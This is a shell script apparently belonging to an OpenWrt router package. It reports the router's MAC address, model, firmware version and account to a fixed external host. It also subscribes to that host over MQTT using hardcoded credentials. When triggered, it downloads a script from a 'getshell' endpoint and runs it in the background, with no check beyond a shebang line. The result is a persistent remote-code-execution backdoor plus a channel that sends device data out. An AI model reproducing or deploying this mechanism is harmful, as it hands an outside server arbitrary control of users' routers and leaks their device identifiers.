#!/bin/sh

PID=$$
DEV=/dev/natcap_ctl
test -c $DEV || exit 1

HOST=router-sh.ptpt52.com

b64encode() {
	cat - | base64 | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' | sed 's/ //g;s/=/_/g'
}

ACC=$1
ACC=`echo -n "$ACC" | b64encode`
CLI=`cat $DEV | grep default_mac_addr | grep -o '[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]' | sed 's/:/-/g'`
test -n "$CLI" || CLI=`sed 's/:/-/g' /sys/class/net/eth0/address | tr a-z A-Z`

MOD=`cat /etc/board.json | grep model -A2 | grep id\": | sed 's/"/ /g' | awk '{print $3}'`

cd /tmp

# mytimeout [Time] [cmd]
mytimeout() {
	local T=0
	while test -f /tmp/natcapd.extra.dir/$PID; do
		if timeout -t15 sh -c "$2" 2>/dev/null; then
			return 0
		else
			T=$((T+15))
			if test $T -ge $1; then
				return 0
			fi
		fi
	done
	return 1
}

mqtt_cli() {
	while :; do
		test -f /tmp/natcapd.extra.dir/$PID || exit 0
		mosquitto_sub -h $HOST -t "/gfw/device/$CLI" -u ptpt52 -P 153153 --quiet -k 180 | while read _line; do
			timeout -t5 sh -c 'echo >/tmp/trigger_natcapd_extra.fifo'
		done
		sleep 60
	done
}

main_trigger() {
	local SEQ=0
	. /etc/openwrt_release
	TAR=`echo $DISTRIB_TARGET | sed 's/\//-/g'`
	VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | b64encode`
	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
	while :; do
		test -f /tmp/natcapd.extra.dir/$PID || exit 0
		test -p /tmp/trigger_natcapd_extra.fifo || { sleep 1 && continue; }
		mytimeout 660 'cat /tmp/trigger_natcapd_extra.fifo >/dev/null'
		{
			rm -f /tmp/xx.extra.sh
			rm -f /tmp/nohup.out
			UP=`cat /proc/uptime | cut -d"." -f1`
			CV=`uci get natcapd.default.config_version 2>/dev/null`
			ACC=`uci get natcapd.default.account 2>/dev/null`
			URI="/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER&cv=$CV&tar=$TAR&mod=$MOD&seq=$SEQ&up=$UP"
			/usr/bin/wget --timeout=180 --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.extra.sh \
				"https://$HOST$URI" || {
					continue
				}
			head -n1 /tmp/xx.extra.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
				chmod +x /tmp/xx.extra.sh
				nohup /tmp/xx.extra.sh &
			}
			SEQ=$((SEQ+1))
		}
	done
}

keep_alive() {
	touch /tmp/natcapd.extra.running
	while :; do
		test -f /tmp/natcapd.extra.dir/$PID || exit 0
		while ! mkdir /tmp/natcapd.extra.lck 2>/dev/null; do sleep 1; done
		cat /proc/uptime | cut -d"." -f1 >/tmp/natcapd.extra.uptime
		rmdir /tmp/natcapd.extra.lck
		sleep 60
	done
}

mkdir -p /tmp/natcapd.extra.dir
rm -f /tmp/natcapd.extra.dir/*
touch /tmp/natcapd.extra.dir/$PID

mkfifo /tmp/trigger_natcapd_extra.fifo
main_trigger &
mqtt_cli &
timeout -t5 sh -c 'echo >/tmp/trigger_natcapd_extra.fifo'
sleep 120
timeout -t5 sh -c 'echo >/tmp/trigger_natcapd_extra.fifo'
keep_alive
